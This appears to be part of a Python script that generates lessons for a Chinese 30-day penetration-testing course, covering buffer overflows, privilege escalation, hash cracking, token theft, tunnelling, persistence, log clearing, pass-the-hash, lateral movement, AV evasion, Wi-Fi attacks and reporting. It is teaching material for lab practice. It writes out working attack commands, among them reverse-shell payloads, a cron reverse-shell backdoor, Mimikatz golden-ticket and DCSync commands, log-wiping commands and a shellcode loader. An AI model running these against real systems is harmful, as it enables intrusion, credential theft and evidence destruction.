| IIS 6 | file.asp;.jpg→分号截断 |
| Nginx | file.jpg/.php→路径解析 |
| IIS 7+ | FastCGI->cgi.fix_pathinfo=1 |""")],[('.htaccess攻击','⭐⭐⭐⭐⭐','高','AddType使.jpg被PHP解析'),('解析漏洞','⭐⭐⭐⭐','中','Apache多后缀/IIS分号/Nginx路径')],[('上传','"绕过前端→绕过MIME→绕过扩展名→绕过内容→条件竞争→解析利用"','',)],[('改了扩展名就安全','图片马! 检查文件头<检查文件内容才是真正的安全检测。')],['在Upload-Labs靶场通关全部20+关卡。'],'文件上传不是"能不能传上去"的问题——是"传上去的能不能被执行"的问题。',
    ),
    (14, '缓冲区溢出基础', '高级', '40',
     '缓冲区溢出是二进制安全的基石。本章详解栈溢出原理、EIP劫持、Shellcode构造(msfvenom)、坏字符处理、DEP/ASLR绕过基础和Immunity/OllyDbg调试器使用。',
     [S('一、栈溢出原理','一栈溢出原理',r"""## 一、栈溢出基础
```
函数调用时的栈帧:
高地址  +------------------+
        |   函数参数        |
        +------------------+
        |   返回地址(EIP)   | ← 覆盖这里控制执行流!
        +------------------+
        |   保存的EBP       |
        +------------------+
低地址  |   局部变量(buf)   | ← 输入溢出从这里开始
        +------------------+
```
```bash
# msfvenom生成Shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f c -b '\x00\x0a\x0d'
```
### 漏洞利用步骤
1. Fuzzing→找到崩溃输入长度
2. 确定EIP覆盖偏移(pattern_create/offset)
3. 找坏字符(排除\x00等)
4. 找JMP ESP地址(!mona modules)
5. 构造Exploit(填充+EIP+Shellcode)""")],[('栈帧结构','⭐⭐⭐⭐','高','局部变量→EBP→EIP→参数'),('EIP劫持','⭐⭐⭐⭐⭐','高','覆盖返回地址→控制程序执行流')],[('溢出','"有溢出不一定能利用——还要过DEP、ASLR、Canary三道关"','',)],[('缓冲区溢出已经过时','DEP/ASLR/CFG等缓解措施让利用更难但并未消除。内存损坏漏洞仍是最危险的漏洞类型之一。')],['在VulnServer或Brainpan靶机上实践栈溢出利用。'],'缓冲区溢出是二进制安全的"乘法口诀"——后面的一切都建立在理解它的基础上。',
    ),
    (15, '系统权限提升思路', '中级', '35',
     '提权是渗透测试的必经之路——从Webshell到root/domain admin。本章详解Linux提权(SUID/Cron/内核/Passwd/Gtfobins)和Windows提权(服务/注册表/计划任务/Token)方法论。',
     [S('一、Linux提权','一linux提权',r"""## 一、Linux提权Checklist
```bash
# 信息收集
id && sudo -l && uname -a && cat /etc/os-release
find / -perm -4000 -type f 2>/dev/null  # SUID
find / -perm -2 -type f 2>/dev/null  # 可写文件
cat /etc/crontab; ls -la /etc/cron*
# SUID提权
# find . -exec /bin/sh \; -quit (如果find有SUID)
# 内核提权
uname -a → searchsploit查找内核漏洞
# 工具
LinPEAS: 自动化Linux提权枚举
```
### Windows提权Checklist
```powershell
whoami /priv && systeminfo && net user
# 服务提权
Get-Service | Where-Object StartType -eq "Auto" → 检查可写服务路径
# 计划任务
schtasks /query /fo LIST
```""")],[('Linux提权','⭐⭐⭐⭐','高','SUID/可写Cron/内核漏洞/Gtfobins'),('LinPEAS/WinPEAS','⭐⭐⭐⭐','中','全自动提权信息收集脚本')],[('提权','"提权不是运气——是系统化地检查每一项配置错误"','',)],[('拿到了Webshell就够了','Webshell权限通常只有www-data。90%的目标价值都在提权后才能访问。')],['使用LinPEAS/WinPEAS在靶机上做完整提权枚举。'],'提权的艺术在于——在看似正常的系统配置中找到那个"不正常的缺口"。',
    ),
    (16, '本地密码哈希破解', '中级', '30',
     '从SAM/SYSTEM或/etc/shadow提取哈希→离线破解。本章详解Windows哈希(NTLM/NTLMv2)、Linux哈希($1$/$5$/$6$/yescrypt)、HashcatGPU加速破解、彩虹表和字典生成(密码心理学)。',
     [S('一、Hashcat实战','一hashcat实战',r"""## 一、Hashcat模式与速度
| Hash类型 | -m | 示例 | RTX4090速度 |
|:---|:---|:---|:---:|
| NTLM | 1000 | Windows本地哈希 | 150GH/s |
| NetNTLMv2 | 5600 | SMB认证 | 25GH/s |
| SHA256 | 1400 | Linux /etc/shadow | 500MH/s |
| WPA2 | 22000 | Wi-Fi握手包 | 2MH/s |
| MD5 | 0 | 弱哈希 | 200GH/s |
```bash
# 提取Windows哈希
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
secretsdump.py -sam sam.save -system system.save LOCAL

# Hashcat破解
hashcat -m 1000 -a 0 hashes.txt rockyou.txt
hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?l?d?d  # 掩码攻击
```""")],[('NTLM破解','⭐⭐⭐⭐','中','Hashcat -m 1000; GPU加速极快'),('密码心理学','⭐⭐⭐','中','Season+Year+Symbol!最常用组合')],[('破解','"不是所有密码都能破——是足够弱的密码一定被破"','',)],[('密码哈希就能防破解','NTLM未加盐+GPU加速——8位内大小写+数字组合不到1小时即可破解。')],['用Hashcat破解一组NTDS.dit提取的哈希。'],'密码安全不在于"有没有被加密"——在于"加密后还能不能被破解"。',
    ),
    (17, '令牌窃取与Rotten Potato', '高级', '35',
     'Windows令牌(token)是进程安全上下文的凭据——窃取高权限令牌=提权。本章详解Token窃取原理、Incognito模块、Hot Potato/Rotten/Juicy/PrintSpoofer Potato家族和Named Pipe模拟攻击。',
     [S('一、Potato家族','一potato家族',r"""## 一、Potato提权演变
| Potato | 年份 | 利用COM对象 | 条件 |
|:---|:---|:---|:---|
| Hot | 2016 | BITS | Windows 7-10 |
| Rotten | 2016 | 本地NTLM反射 | SeImpersonate |
| Juicy | 2019 | CLSID:4991d34b | 需要CLSID |
| Sweet | 2022 | WinRM | WinRM服务 |
| PrintSpoofer | 2020 | 命名管道 | SeImpersonate |
```powershell
# 检查是否有SeImpersonate权限
whoami /priv | findstr SeImpersonate
# IIS/Service账户通常有此权限
# JuicyPotato利用
JuicyPotato.exe -t * -p cmd.exe -l 1337
# PrintSpoofer
PrintSpoofer.exe -i -c cmd
```""")],[('SeImpersonate','⭐⭐⭐⭐⭐','高','模拟客户端权限→NTLM认证反射→Token窃取'),('Potato家族','⭐⭐⭐⭐','高','Hot→Rotten→Juicy→PrintSpoofer→Sweet')],[('Token','"IIS和Service账户=SeImpersonate=Potato提权"','',)],[('SeImpersonate不常见','IIS APPPOOL\DefaultAppPool和NETWORK SERVICE默认就有SeImpersonate——非常常见！')],['在Windows靶机上实践Potato提权攻击链。'],'Token窃取的优雅之处——不需要漏洞，只需要权限配置"恰当"。',
    ),
    (18, 'Linux权限提升', '高级', '40',
     'Linux提权进阶：Capabilities滥用、Docker逃逸、LD_PRELOAD劫持、共享库劫持、NFS提权和Sudo绕过(sudoedit/通配符/pkexec)。',
     [S('一、Linux提权进阶','一linux提权进阶',r"""## 一、Capabilities提权
```bash
getcap -r / 2>/dev/null
# python3.8 = cap_setuid+ep → 提权!
./python3.8 -c 'import os;os.setuid(0);os.system("/bin/bash")'

# Docker逃逸
docker run -v /:/host -it alpine chroot /host
# 挂载宿主机根目录→容器内chroot获得宿主机root

# LD_PRELOAD劫持
# 先编译恶意.so，再export LD_PRELOAD
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so command
```
### Sudo绕过
```bash
# sudoedit(CVE-2021-3156) Baron Samedit
# pkexec(CVE-2021-4034) PwnKit
# Sudo 1.8.0-1.9.5p1全部受影响!

# Sudo通配符绕过
# sudo允许: user ALL=(ALL) /usr/bin/cat /var/log/*
# 利用: sudo cat /var/log/../../etc/shadow
```""")],[('Capabilities','⭐⭐⭐⭐','高','cap_setuid等可提权；比SUID更隐蔽'),('CVE-2021-4034','⭐⭐⭐⭐⭐','高','PwnKit:pkexec本地提权(PolKit)')],[('Linux提权','"SUID看过了看Capabilities，内核看过了看Sudo，Docker看过了看LD_PRELOAD"','',)],[('打了补丁就不能提权','CVE-2021-4034在2022年初才被修复——pkexec已经存在12年！')],['在HackTheBox/VulnHub Linux靶机上实践各种提权技术。'],'Linux提权的魅力——系统越复杂，配置错误越多，提权路径越丰富。',
    ),
    # Day 19-24
    (19, '隐藏通信隧道', '高级', '35',
     '隧道技术让攻击流量"隐身"在正常协议中。本章详解SSH隧道(本地/远程/动态)、DNS隧道(dns2tcp/iodine)、ICMP隧道、HTTP/HTTPS隧道和Cobalt Strike Malleable C2配置。',
     [S('一、SSH隧道','一ssh隧道',r"""## 一、SSH三种隧道
```bash
# 本地转发(-L): 本地端口→远程主机
ssh -L 8080:internal-web:80 user@jump-server
# 远程转发(-R): 远程端口→本地主机(穿透防火墙)
ssh -R 2222:localhost:22 user@attacker
# 动态转发(-D): SOCKS代理
ssh -D 1080 user@jump-server
```
### DNS隧道(iodine)
```bash
# Server端(需要域名NS指向)
iodined -f -P password 10.0.0.1 tunnel.example.com
# Client端
iodine -f -P password tunnel.example.com
# 然后通过10.0.0.1的SSH/HTTP等通信(数据走DNS!)
```"""),S('二、C2 Malleable C2','二c2-malleable-c2',r"""## 二、Cobalt Strike Malleable C2
```text
# Malleable C2 Profile
# 将C2流量伪装成正常流量(如jQuery请求)
set jitter "30";  # 心跳随机抖动30%
set useragent "Mozilla/5.0...";
http-get {
    uri "/api/v1/status";
    client { header "Accept" "application/json"; }
    server { output { print; } }
}
```""")],[('SSH隧道','⭐⭐⭐⭐','高','-L本地/-R远程/-D SOCKS'),('DNS隧道','⭐⭐⭐⭐','高','数据编码在DNS查询中→穿透大部分防火墙')],[('隧道','"本地翻墙、远程穿透、动态代理——SSH一个工具三种隧道"','',)],[('防火墙放行53端口就够了','DNS隧道可被DPI(深度包检测)识别——正常DNS查询的域名熵值不会像隧道那么高。')],['搭建iodine DNS隧道，用Wireshark分析隧道流量特征。'],'隧道是攻击者的"隐身衣"——在正常协议的外表下，偷渡着恶意数据。',
    ),
    (20, '权限维持', '高级', '35',
     '拿到权限不够，还要保持在目标中的访问能力。本章详解Linux权限维持(Crontab/.ssh/SUID后门/rootkit)和Windows权限维持(计划任务/注册表Run/WMI/服务/COM劫持/Golden Ticket)。',
     [S('一、Linux后门','一linux后门',r"""## 一、Linux权限维持
```bash
# SSH密钥后门
echo "ssh-rsa AAA..." >> ~/.ssh/authorized_keys
# Crontab反弹Shell
(crontab -l; echo "*/5 * * * * /bin/bash -c '/dev/tcp/IP/4444'") | crontab -
# SUID Shell
cp /bin/bash /tmp/.hidden; chmod 4755 /tmp/.hidden
# PAM后门(替换pam_unix.so→记录所有密码)
```
### Windows权限维持
```powershell
# 计划任务
schtasks /create /tn "Update" /tr "powershell -enc XXX" /sc hourly
# 注册表Run
Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Update" -Value "C:\malware.exe"
# WMI事件订阅
$filter = Set-WmiInstance -Class __EventFilter -Arguments @{Name="Filter";EventNameSpace="root\cimv2";QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}
# Golden Ticket(Mimikatz)
mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-xxx /krbtgt:hash /user:fakeadmin
```""")],[('Linux持久化','⭐⭐⭐⭐','高','SSH密钥/Cron/SUID/PAM后门'),('Golden Ticket','⭐⭐⭐⭐⭐','高','krbtgt哈希→任意TGT→永久域控访问')],[('持久化','"拿到权限只是上半场——保住权限才是下半场"','',)],[('清除恶意软件就清除后门','专业攻击者会部署多层后门——你发现了一个还有五个。权限维持需要全面排查+威胁狩猎。')],['在靶机上练习3种以上Linux和Windows后门技术。'],'权限维持是APT与普通黑客的分水岭——前者在目标网络中一待就是数月甚至数年。',
    ),
    (21, '痕迹清理', '中级', '25',
     '高明的攻击者不留痕迹。本章详解Linux日志清理(bash_history/wtmp/lastlog/auth.log)、Windows日志清理(EventLog/wevtutil)、文件时间戳修改(timestomp)、代理跳板清理和Meterpreter痕迹清理。',
     [S('一、清理技术','一清理技术',r"""## 一、痕迹清理Checklist
```bash
# Linux
echo > ~/.bash_history && history -c
echo > /var/log/auth.log
echo > /var/log/syslog
> /var/log/wtmp && > /var/log/lastlog

# Windows
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
# 或Invoke-Phant0m(停止EventLog服务)
# Meterpreter
timestomp file.txt -c "01/01/2023 10:00:00"
clearev
```""")],[('EventLog清理','⭐⭐⭐⭐','中','wevtutil cl / Meterpreter clearev'),('timestomp','⭐⭐⭐','中','修改文件MAC时间戳')],[('清理','"不擦脚印的贼不是好贼——但擦得太干净反而暴露(日志缺失本身就是告警)"','',)],[('清理了日志就安全','日志缺失本身就会触发SIEM告警！专业清理方式是选择性删除而不是全清。')],['在测试环境练习日志清理后观察SIEM端的变化。'],'痕迹清理的最高境界——不是删除日志，而是让日志看起来一切正常。',
    ),
    (22, '内网渗透基础', '高级', '40',
     '从DMZ到内网是渗透测试的"质变"。本章详解内网信息收集(网络拓扑/域信息/密码策略)、横向移动基础(psexec/WMI/WinRM/SSH)、内网端口扫描和代理链搭建(proxychains/socks5)。',
     [S('一、内网信息收集','一内网信息收集',r"""## 一、内网信息收集
```bash
# 网络发现
ipconfig /all && route print && arp -a
netstat -ano | findstr ESTABLISHED
# 域信息
net view /domain && net group "Domain Admins" /domain
nltest /dclist:corp.local
# BloodHound收集(SharpHound)
SharpHound.exe -c All,LoggedOn
# 代理搭建
# VPS→内网入口机器→内网
# 入口机器上:
socat TCP-LISTEN:1080,fork TCP:VPS_IP:1080 &  # 反向SOCKS
# VPS上运行proxychains指向127.0.0.1:1080
```""")],[('内网渗透','⭐⭐⭐⭐⭐','高','从DMZ→内网的信息收集+横向移动'),('代理链','⭐⭐⭐⭐','高','socat/chisel/proxychains/frp')],[('内网','"拿下第一台机器不算赢——能横向到域控才算"','',)],[('内网就是安全的','内网往往是"软中心"——外层防御严密但内部几乎无防护。横向移动很容易。')],['搭建内网实验环境，实践从DMZ→域控的完整横向移动。'],'内网渗透的核心理念——"破一点，打通全局"。',
    ),
    (23, 'Pass The Hash', '高级', '30',
     'PtH(Pass The Hash)利用NTLM哈希直接认证——不需要明文密码。本章详解NTLM认证流程、Mimikatz哈希提取(sekurlsa/logonpasswords/dcsync)、PtH工具(PsExec/Impacket/CrackMapExec)和PtH检测与防御。',
     [S('一、PtH攻击链','一pth攻击链',r"""## 一、Pass The Hash实战
```bash
# 1. 提取哈希
mimikatz # sekurlsa::logonpasswords  # LSASS内存哈希
mimikatz # lsadump::dcsync /domain:corp /user:krbtgt  # DCSync

# 2. PtH执行命令
psexec.py -hashes :NTLMHASH domain/user@target cmd
wmiexec.py -hashes :NTLMHASH domain/user@target
crackmapexec smb 192.168.1.0/24 -u user -H NTLMHASH
# 3. CME扫描全网SMB
crackmapexec smb targets.txt -u admin -H :HASH --local-auth
```
### NTLM vs Kerberos
| 特性 | NTLM | Kerberos |
|:---|:---|:---|
| PtH可能? | ✅ 容易 | ❌ 需TGT |
| 防御 | NTLM审计限制 | 无对应 |
| 现状 | 向后兼容仍广泛使用 | Win2000+默认 |""")],[('PtH','⭐⭐⭐⭐⭐','高','NTLM哈希直接认证→不需要明文密码'),('Mimikatz','⭐⭐⭐⭐⭐','高','sekurlsa/logonpasswords/dcsync')],[('哈希传递','"有哈希=有密码——NTLM协议设计如此"','',)],[('PtH是Windows漏洞','PtH是NTLM协议的设计特性而非漏洞——除非微软彻底淘汰NTLM。')],['搭建Windows域环境，实践PtH从普通用户到域控的攻击链。'],'Pass The Hash不需要漏洞——它只是利用了NTLM协议"相信哈希=相信身份"的设计。',
    ),
    (24, '横向移动', '高级', '35',
     '横向移动(Lateral Movement)是内网渗透的核心战术。本章详解PsExec/SMBExec/WMIExec/WinRM/DCOM等横向移动技术、攻击链自动化(CrackMapExec/BloodHound)和权限提升配合。',
     [S('一、横向移动技术矩阵','一横向移动技术矩阵',r"""## 一、横向移动八大技术
| 技术 | 协议 | 端口 | 工具 | 日志 |
|:---|:---|:---|:---|:---|
| PsExec | SMB | 445 | psexec.py | 7045 |
| WMIExec | DCOM | 135 | wmiexec.py | 4688 |
| SMBExec | SMB | 445 | smbexec.py | 7045 |
| WinRM | WS-Man | 5985 | evil-winrm | 4624 |
| DCOM | DCOM | 135 | dcomexec.py | 10028 |
| RDP | RDP | 3389 | xfreerdp | 4624 |
| SSH | SSH | 22 | ssh | auth.log |
| Scheduled Tasks | SMB | 445 | at/schtasks | 4698 |
```bash
# CME批量横向
crackmapexec smb targets.txt -u admin -p pass -x whoami
crackmapexec winrm targets.txt -u admin -p pass -x whoami
# BloodHound分析最短攻击路径
MATCH p = shortestPath((u:User {name:'JSMITH@CORP.LOCAL'})-[*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'})) RETURN p
```""")],[('八大横向技术','⭐⭐⭐⭐⭐','高','PsExec/WMI/SMB/WinRM/DCOM/RDP/SSH/计划任务'),('CrackMapExec','⭐⭐⭐⭐⭐','中','CME:批量内网横向工具')],[('横向','"一条凭据走天下——内网中处处都是同一套密码"','',)],[('横向移动很难','对攻击者来说横向移动往往比入口更简单——因为内网安全管控远远弱于边界。')],['用CME在实验环境中批量测试横向移动，观察产生的Event Log。'],'横向移动让一次"单点突破"演变成"全网沦陷"。',
    ),
    # Day 25-30
    (25, 'Metasploit高级用法', '高级', '35',
     'Metasploit是渗透测试框架之王。本章详解MSF模块开发、Meterpreter高级功能(提权/哈希dump/键盘记录/端口转发)、AutoRunScript、Resource脚本和后渗透模块(kiwi/mimikatz)。',
     [S('一、Meterpreter后渗透','一meterpreter后渗透',r"""## 一、Meterpreter核心命令
```bash
# Meterpreter会话
meterpreter> getsystem           # 提权到SYSTEM
meterpreter> hashdump            # 导出SAM哈希
meterpreter> load kiwi           # 加载Mimikatz
meterpreter> creds_all           # 所有凭据
meterpreter> keyscan_start       # 键盘记录
meterpreter> portfwd add -L 0.0.0.0 -l 3389 -r target -p 3389
meterpreter> run post/windows/gather/enum_domain
```
### Resource脚本自动化
```ruby
# auto.rc
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.0.0.1
set LPORT 4444
set AutoRunScript post/windows/gather/smart_hashdump
exploit -j -z
```""")],[('Meterpreter','⭐⭐⭐⭐⭐','中','getsystem/hashdump/kiwi/portfwd'),('Resource脚本','⭐⭐⭐⭐','中','RC文件自动化渗透脚本')],[('MSF','"漏洞利用+后渗透=Meterpreter+post模块"','',)],[('MSF只能用在渗透测试','MSF也有防御团队使用——通过MSF模拟攻击测试蓝队检测能力。')],['编写MSF Resource脚本自动化一个完整后渗透流程。'],'Metasploit让复杂的攻击链变成"一条命令"。',
    ),
    (26, '免杀技术基础', '高级', '35',
     '免杀(Anti-Virus Evasion)是红队必备技能。本章详解免杀原理(静态签名/动态行为/启发式)、编码混淆(XOR/Base64/AES)、Shellcode加载器(C++/C#/PowerShell/VBA)、进程注入和沙箱检测绕过技术。',
     [S('一、免杀技术栈','一免杀技术栈',r"""## 一、免杀技术全景
| 技术层 | 方法 | 绕过的检测 |
|:---|:---|:---|
| 静态 | XOR/AES加密+动态解密 | 静态签名 |
| 静态 | 代码混淆/控制流平坦化 | 静态分析 |
| 动态 | API Unhooking | EDR Hook |
| 动态 | 进程注入(PPID Spoofing) | 行为检测 |
| 动态 | Syscall直接调用 | 用户态Hook |
| 沙箱 | 延迟执行+环境检测 | 沙箱分析 |
```cs
// C# Shellcode加载器(简化)
byte[] shellcode = Decrypt(encryptedShellcode, key);
IntPtr ptr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
Marshal.Copy(shellcode, 0, ptr, shellcode.Length);
// 调用shellcode...
```""")],[('免杀技术','⭐⭐⭐⭐⭐','高','加密混淆→API Unhooking→Syscall→沙箱绕过'),('Shellcode加载器','⭐⭐⭐⭐','高','C++/C#/PowerShell/VBA')],[('免杀','"静态靠加密混淆，动态靠unhooking，沙箱靠延迟执行"','',)],[('免杀就是让文件不被检测','现代EDR主要靠行为检测而非文件扫描。即使文件免杀，运行时行为仍可能被EDR捕获。')],['用Veil或手动编写一个PowerShell免杀shellcode加载器。'],'免杀不是一次性的——AV/EDR持续更新，免杀是持续的猫鼠游戏。',
    ),
    (27, '无线网络安全', '中级', '30',
     'Wi-Fi安全从WEP到WPA3，攻击技术不断演进。本章详解Wi-Fi攻击(Deauth/KRACK/PMKID/WPS)、Aircrack-ng/Reaver/Hashcat WiFi破解、Evil Twin钓鱼AP和无线安全监控。',
     [S('一、Wi-Fi攻击','一wi-fi攻击',r"""## 一、Wi-Fi攻击矩阵
```bash
# 监听模式
airmon-ng start wlan0
airodump-ng wlan0mon
# Deauth攻击(强制客户端重连→抓握手包)
aireplay-ng -0 10 -a AP_MAC -c CLIENT_MAC wlan0mon
# WPA2 PMKID攻击(无需客户端!)
hcxdumptool -o capture.pcapng -i wlan0mon --enable_status=1
hcxpcaptool -z pmkid.22000 capture.pcapng
hashcat -m 22000 pmkid.22000 wordlist.txt
# Evil Twin(钓鱼AP)
airbase-ng -e "Free WiFi" -c 6 wlan0mon
# KRACK(CVE-2017-13082)
# WPA2四次握手重装密钥攻击
```""")],[('Wi-Fi攻击','⭐⭐⭐⭐','中','Deauth/PMKID抓取/WPS PIN/Evil Twin/KRACK'),('Aircrack-ng','⭐⭐⭐⭐','中','Wi-Fi渗透测试核心工具套件')],[('Wi-Fi','"PMKID让Wi-Fi破解不需要客户端——革命性突破"','',)],[('WPA2已经很安全','KRACK(CVE-2017-13082)和PMKID攻击证明了WPA2存在严重缺陷。WPA3修复了这些问题。')],['在授权环境中用Aircrack-ng完成一次WPA2破解。'],'Wi-Fi的"隐形"让很多人忘记了它和网线一样——都是攻击面。',
    ),
    (28, '缓冲区溢出利用开发', '高级', '40',
     '从"能崩溃"到"能利用"的完整旅程。本章详解Exploit开发流程、Egg Hunter技术(当缓冲区太小时)、SEH覆盖利用、Unicode/Alpha混编Shellcode编码、ROP链构造和DEP/ASLR绕过实战。',
     [S('一、Exploit开发','一exploit开发',r"""## 一、Exploit开发完整流程
```text
1. Fuzzing → 确定崩溃输入长度
2. 确定EIP偏移 → pattern_create/offset
3. 坏字符分析 → 发送所有字符→排除导致异常的
4. 找JMP ESP → !mona jmp -r esp
5. 构造Payload → 填充+EIP+NOP+Shellcode
6. 测试 → 获得Shell!
```
### ROP绕过DEP
```text
DEP(数据执行保护)阻止栈上Shellcode执行
→ ROP(Return-Oriented Programming)
→ 使用已有代码片段(gadget)构造执行链
→ VirtualProtect→修改Shellcode内存为可执行→跳转执行
```
### Egg Hunter
```text
当缓冲区太小放不下完整Shellcode时:
1. 先把Shellcode放在另一个内存位置(带egg标记)
2. Egg Hunter代码: 在内存中搜索egg标记
3. 找到egg→跳转到Shellcode执行
```""")],[('Exploit开发','⭐⭐⭐⭐⭐','高','Fuzzing→偏移→坏字符→JMP→Payload'),('ROP','⭐⭐⭐⭐','高','绕过DEP：用已有代码片段构造执行链')],[('Exploit','"不是每个崩溃都能利用——但每个可利用的漏洞都始于崩溃"','',)],[('缓冲区溢出利用是过去的事了','新的缓解措施(CFG/CET/ASLR强化)增加难度但未消除。内存腐蚀(Memory Corruption)仍然是CVE中占比最大的漏洞类型。')],['在Brainpan/OST等靶机上完整开发一个Buffer Overflow Exploit。'],'Exploit开发让你从"工具使用者"变成"工具制造者"。',
    ),
    (29, '综合靶机渗透演练', '高级', '40',
     '将前28天技能用于实战！本章以OSCP风格靶机(HackTheBox/VulnHub/PG)为例，走完整渗透流程：信息收集→漏洞发现→漏洞利用→提权→后渗透→痕迹清理→报告撰写。',
     [S('一、渗透方法论','一渗透方法论',r"""## 一、标准化渗透流程
```
阶段 1: 信息收集(30%时间)
├── 被动: OSINT/Shodan/DNS
├── 主动: Nmap/目录扫描
└── 输出: 攻击面列表

阶段 2: 漏洞发现(20%时间)
├── Web测试: Burp手动+自动化
├── 服务漏洞: Searchsploit+Nessus
└── 输出: 可利用漏洞列表

阶段 3: 漏洞利用(25%时间)
├── 初始访问: WebShell/反弹Shell
├── 稳定Shell: PTY升级
└── 输出: 初始立足点

阶段 4: 后渗透(25%时间)
├── 提权: Linux/Windows提权
├── 横向移动: 内网渗透
├── 目标达成: 获取Flags
└── 输出: 完整攻击路径
```""")],[('渗透方法论','⭐⭐⭐⭐⭐','中','信息收集→漏洞发现→利用→后渗透'),('OSCP风格','⭐⭐⭐⭐','中','HackTheBox/VulnHub靶机实战')],[('渗透','"渗透不是单点突破——是完整方法论的全链条实践"','',)],[('靶机=真实环境','靶机简化了真实环境的复杂性(如WAF/CDN/IDS/日志监控)。但核心方法论是相通的。')],['挑战HackTheBox/PG至少5台靶机(从Easy到Hard)。'],'渗透测试最深的秘密——80%的成功来自扎实的信息收集和系统化方法论，而不是"牛逼的0day"。',
    ),
    (30, '渗透测试报告', '中级', '30',
     '渗透测试的最终交付物不是Shell——是报告。本章详解专业渗透测试报告结构(摘要→方法→发现→风险评估→修复建议)、CVSS评分应用、Executive vs Technical双版本和报告自动生成工具(Dradis/AttackForge)。',
     [S('一、报告结构','一报告结构',r"""## 一、专业报告结构
```
1. Executive Summary(管理层摘要)
   ├── 整体风险评级
   ├── 关键发现(TOP 3-5)
   └── 建议摘要
2. Methodology(测试方法)
   ├── 测试范围
   ├── 测试类型(黑/白盒)
   └── 工具列表
3. Findings(技术发现)
   对每个漏洞:
   ├── 漏洞名称+CVSS评分
   ├── 技术描述
   ├── 复现步骤(含截图)
   ├── 影响分析
   └── 修复建议(具体可操作)
4. Risk Matrix(风险矩阵)
5. Appendices(附录)
```
### 报告工具
| 工具 | 特点 |
|:---|:---|
| Dradis | 协作式渗透测试报告平台 |
| AttackForge | 企业级PT管理 |
| Serpico | 开源报告生成 |
| PlexTrac | 渗透测试工作流管理 |""")],
        [('报告结构','⭐⭐⭐⭐⭐','中','摘要→方法→发现→风险评估→修复建议'),
         ('CVSS评分','⭐⭐⭐⭐','中','每个漏洞附CVSS 3.1评分')],
        [('报告','"报告不是技术笔记——是让管理层看懂并愿意修的商业文档"','',)],
        [('报告越详细越好','管理层只看Executive Summary中的关键数字和风险评级。技术细节放附录。')],
        ['为一个靶机渗透实践撰写专业渗透测试报告。'],
        "渗透测试报告是你唯一看得见的输出——Shell在服务器上，报告在客户手上。三十年渗透之旅，从黑客思维到专业交付，你完成了。",
    ),
]

print("\n=== GENERATING PENETRATION Day 1-30 ===")
for d in pen_days:
    make_day('penetration', *d)
    print(f"  [PENETRATION] Day {d[0]} done")
    sys.stdout.flush()

print(f"\n=== ALL DONE! Total lines: {tl} ===")
